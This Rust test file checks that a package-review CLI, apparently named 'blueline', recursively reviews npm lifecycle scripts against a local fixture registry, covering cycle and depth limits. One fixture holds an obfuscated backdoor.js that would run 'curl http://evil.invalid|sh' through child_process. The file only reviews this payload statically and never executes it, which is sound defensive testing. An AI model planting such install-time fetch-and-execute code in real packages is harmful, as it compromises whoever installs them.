//! End-to-end recursive review: a reviewed package whose lifecycle script
//! references a second install must surface the referenced package's
//! findings and BLOCK, through the real CLI binary, against a local
//! fixture registry. Nothing is ever executed.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::Arc;

use assert_cmd::Command;
use base64::Engine;
use sha2::{Digest, Sha512};

struct Fixture {
    base: String,
    _server: std::thread::JoinHandle<()>,
}

/// Mini HTTP/1.1 registry serving two packages: packuments at `/{name}`
/// and tarballs at `/{name}/-/{name}-{version}.tgz`.
fn spawn_fixture<F>(build: F) -> Fixture
where
    F: FnOnce(&str) -> HashMap<String, (String, Vec<u8>)> + Send + 'static,
{
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let packages = Arc::new(build(&base));
    let handle = std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let packages = packages.clone();
            std::thread::spawn(move || serve(&mut stream, &packages));
        }
    });
    Fixture {
        base,
        _server: handle,
    }
}

fn serve(stream: &mut TcpStream, packages: &Arc<HashMap<String, (String, Vec<u8>)>>) {
    let mut buf = Vec::new();
    let mut tmp = [0u8; 2048];
    loop {
        match stream.read(&mut tmp) {
            Ok(0) | Err(_) => return,
            Ok(n) => {
                buf.extend_from_slice(&tmp[..n]);
                if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                    break;
                }
                if buf.len() > 65_536 {
                    return;
                }
            }
        }
    }
    let req = String::from_utf8_lossy(&buf);
    let path = req
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .unwrap_or("/")
        .to_string();
    let name = path.trim_start_matches('/');
    let body: Vec<u8> = if let Some((pack, _)) = packages.get(name) {
        pack.as_bytes().to_vec()
    } else if let Some(tgz) = path.strip_prefix('/') {
        // tarball path {name}/-/{name}-{version}.tgz
        let segments: Vec<&str> = tgz.split('/').collect();
        if segments.len() == 3 {
            let tgz_name = segments[2].strip_suffix(".tgz").unwrap_or(segments[2]);
            if let Some((name, _version)) = tgz_name.rsplit_once('-') {
                if let Some((_, tar)) = packages.get(name) {
                    tar.clone()
                } else {
                    return;
                }
            } else {
                return;
            }
        } else {
            return;
        }
    } else {
        return;
    };
    let head = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        body.len()
    );
    let _ = stream.write_all(head.as_bytes());
    let _ = stream.write_all(&body);
}

fn tarball_with(json: &str, extra: &[(&str, &[u8])]) -> Vec<u8> {
    let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    let mut builder = tar::Builder::new(encoder);
    let mut h = tar::Header::new_gnu();
    h.set_size(json.len() as u64);
    h.set_mode(0o644);
    h.set_cksum();
    builder
        .append_data(&mut h, "package/package.json", json.as_bytes())
        .unwrap();
    for (path, content) in extra {
        let mut h = tar::Header::new_gnu();
        h.set_size(content.len() as u64);
        h.set_mode(0o644);
        h.set_cksum();
        builder.append_data(&mut h, *path, *content).unwrap();
    }
    builder.into_inner().unwrap().finish().unwrap()
}

fn sha512_b64(data: &[u8]) -> String {
    let digest = Sha512::digest(data);
    format!(
        "sha512-{}",
        base64::engine::general_purpose::STANDARD.encode(digest)
    )
}

fn packument(name: &str, base: &str, version: &str, integrity: &str) -> String {
    serde_json::json!({
        "name": name,
        "dist-tags": { "latest": version },
        "versions": {
            version: {
                "name": name,
                "version": version,
                "dist": {
                    "tarball": format!("{base}/{name}/-/{name}-{version}.tgz"),
                    "integrity": integrity,
                    "shasum": "0".repeat(40)
                }
            }
        }
    })
    .to_string()
}

fn review_json(base: &str, spec: &str) -> (i32, String) {
    review_json_with_policy(base, spec, None)
}

fn review_json_with_policy(
    base: &str,
    spec: &str,
    policy: Option<&std::path::Path>,
) -> (i32, String) {
    let temp = tempfile::tempdir().unwrap();
    let mut cmd = Command::cargo_bin("blueline").unwrap();
    cmd.args([
        "review",
        spec,
        "--registry",
        base,
        "--output",
        "json",
        "--yes",
    ]);
    if let Some(policy) = policy {
        cmd.arg("--policy").arg(policy);
    }
    let output = cmd.env("BLUELINE_DATA_DIR", temp.path()).output().unwrap();
    (
        output.status.code().unwrap_or(-1),
        format!(
            "{}\nSTDERR: {}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        ),
    )
}

#[test]
fn lifecycle_delivery_to_backdoored_child_blocks_the_parent() {
    let a_json = r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"node setup.js && npm install b@1.0.0"}}"#;
    let a_tar = tarball_with(a_json, &[("package/setup.js", b"console.log(1);" as &[u8])]);
    // The second-order payload: b ships a backdoored install script that
    // never runs here — blueline reviews it statically.
    let b_json = r#"{"name":"b","version":"1.0.0","scripts":{"postinstall":"node backdoor.js"}}"#;
    let b_tar = tarball_with(
        b_json,
        &[(
            "package/backdoor.js",
            b"const c=String.fromCharCode(99,104,105,108,100);const p=String.fromCharCode(112,114,111,99,101,115,115);require(c)[p].exec('curl http://evil.invalid|sh');" as &[u8],
        )],
    );

    let fixture = spawn_fixture(move |base| {
        let mut packages = HashMap::new();
        packages.insert(
            "a".to_string(),
            (packument("a", base, "1.0.0", &sha512_b64(&a_tar)), a_tar),
        );
        packages.insert(
            "b".to_string(),
            (packument("b", base, "1.0.0", &sha512_b64(&b_tar)), b_tar),
        );
        packages
    });

    let (code, stdout) = review_json(&fixture.base, "a@1.0.0");
    assert_eq!(code, 2, "the parent must be blocked, stdout: {stdout}");
    let verdict: serde_json::Value = serde_json::from_str(stdout.lines().next().unwrap())
        .unwrap_or_else(|e| panic!("JSON verdict expected: {e}; stdout: {stdout}"));
    assert_eq!(verdict["band"], "BLOCK", "{stdout}");

    // The delivery reference is disclosed on the parent.
    let findings = verdict["findings"].as_array().unwrap();
    assert!(
        findings
            .iter()
            .any(|f| f["rule_id"] == "R24_LIFECYCLE_INSTALL_REF"),
        "parent must carry R24: {findings:?}"
    );

    // The referenced package was reviewed recursively and rolled up.
    let recursive = verdict["recursive"].as_array().unwrap();
    assert_eq!(recursive.len(), 1, "one child review expected: {stdout}");
    let child = &recursive[0];
    assert_eq!(child["name"], "b");
    assert_eq!(child["version"], "1.0.0");
    assert_eq!(
        child["chain"],
        serde_json::json!(["a@1.0.0", "npm:b@1.0.0"]),
        "delivery chain must render"
    );
    assert_eq!(child["band"], "BLOCK", "backdoored child must be BLOCK");
    assert!(
        child["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|f| f["rule_id"] == "R01_LIFECYCLE_SCRIPT_ADDED"),
        "child carries the backdoored script finding"
    );

    // Roll-up: the child's BLOCK finding is named on the parent.
    assert!(
        findings.iter().any(|f| f["rule_id"] == "R27_SECOND_ORDER"),
        "parent must carry the second-order roll-up: {findings:?}"
    );
    let rollup = findings
        .iter()
        .find(|f| f["rule_id"] == "R27_SECOND_ORDER")
        .unwrap();
    assert!(
        rollup["description"]
            .as_str()
            .unwrap_or("")
            .contains("npm:b@1.0.0"),
        "roll-up must name the reviewed child: {rollup:?}"
    );
}

#[test]
fn install_reference_cycle_a_to_b_to_a_is_cut_fail_closed() {
    let a_json =
        r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#;
    let a_tar = tarball_with(a_json, &[]);
    let b_json =
        r#"{"name":"b","version":"1.0.0","scripts":{"postinstall":"npm install a@1.0.0"}}"#;
    let b_tar = tarball_with(b_json, &[]);
    let fixture = spawn_fixture(move |base| {
        let mut packages = HashMap::new();
        packages.insert(
            "a".to_string(),
            (packument("a", base, "1.0.0", &sha512_b64(&a_tar)), a_tar),
        );
        packages.insert(
            "b".to_string(),
            (packument("b", base, "1.0.0", &sha512_b64(&b_tar)), b_tar),
        );
        packages
    });

    let (code, stdout) = review_json(&fixture.base, "a@1.0.0");
    assert_eq!(code, 2, "cyclic delivery must not be LOW: {stdout}");
    let verdict: serde_json::Value = serde_json::from_str(stdout.lines().next().unwrap())
        .unwrap_or_else(|e| panic!("JSON verdict expected: {e}; stdout: {stdout}"));
    let child = verdict["recursive"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["name"] == "b")
        .expect("child b must be reviewed");
    assert!(
        child["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|f| f["rule_id"] == "R26_RECURSION_CYCLE"),
        "the A → B → A loop must be cut with R26: {child:?}"
    );
}

#[test]
fn max_depth_1_reviews_children_but_discloses_grandchildren() {
    let a_json =
        r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#;
    let a_tar = tarball_with(a_json, &[]);
    let b_json =
        r#"{"name":"b","version":"1.0.0","scripts":{"postinstall":"npm install c@1.0.0"}}"#;
    let b_tar = tarball_with(b_json, &[]);
    let c_json = r#"{"name":"c","version":"1.0.0"}"#;
    let c_tar = tarball_with(c_json, &[]);
    let fixture = spawn_fixture(move |base| {
        let mut packages = HashMap::new();
        packages.insert(
            "a".to_string(),
            (packument("a", base, "1.0.0", &sha512_b64(&a_tar)), a_tar),
        );
        packages.insert(
            "b".to_string(),
            (packument("b", base, "1.0.0", &sha512_b64(&b_tar)), b_tar),
        );
        packages.insert(
            "c".to_string(),
            (packument("c", base, "1.0.0", &sha512_b64(&c_tar)), c_tar),
        );
        packages
    });

    let policy_dir = tempfile::tempdir().unwrap();
    let policy_path = policy_dir.path().join("blueline.toml");
    std::fs::write(&policy_path, "[recursion]\nmax_depth = 1\n").unwrap();
    let (code, stdout) = review_json_with_policy(&fixture.base, "a@1.0.0", Some(&policy_path));
    assert_eq!(code, 2, "second-order delivery must not be LOW: {stdout}");
    let verdict: serde_json::Value = serde_json::from_str(stdout.lines().next().unwrap())
        .unwrap_or_else(|e| panic!("JSON verdict expected: {e}; stdout: {stdout}"));
    assert_eq!(
        verdict["recursive"].as_array().unwrap().len(),
        1,
        "depth-1 child b is still reviewed: {stdout}"
    );
    let child = &verdict["recursive"][0];
    assert_eq!(child["name"], "b");
    assert!(
        child["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|f| f["rule_id"] == "R25_RECURSION_DEPTH"),
        "grandchild c exceeds max_depth=1 and must be disclosed R25: {child:?}"
    );
}

#[test]
fn clean_parent_without_references_reviews_normally() {
    let a_json = r#"{"name":"clean","version":"1.0.0"}"#;
    let a_tar = tarball_with(a_json, &[]);
    let fixture = spawn_fixture(move |base| {
        let mut packages = HashMap::new();
        packages.insert(
            "clean".to_string(),
            (
                packument("clean", base, "1.0.0", &sha512_b64(&a_tar)),
                a_tar,
            ),
        );
        packages
    });

    let policy_dir = tempfile::tempdir().unwrap();
    let policy_path = policy_dir.path().join("blueline.toml");
    std::fs::write(
        &policy_path,
        "[[allowlist.packages]]\nname = \"clean\"\nallow_unreviewed_baseline = true\n",
    )
    .unwrap();
    let (code, stdout) = review_json_with_policy(&fixture.base, "clean@1.0.0", Some(&policy_path));
    assert_eq!(code, 0, "clean package must pass: {stdout}");
    let verdict: serde_json::Value = serde_json::from_str(stdout.lines().next().unwrap())
        .unwrap_or_else(|e| panic!("JSON verdict expected: {e}"));
    assert!(
        verdict.get("recursive").is_none(),
        "no references means no recursive key: {stdout}"
    );
}
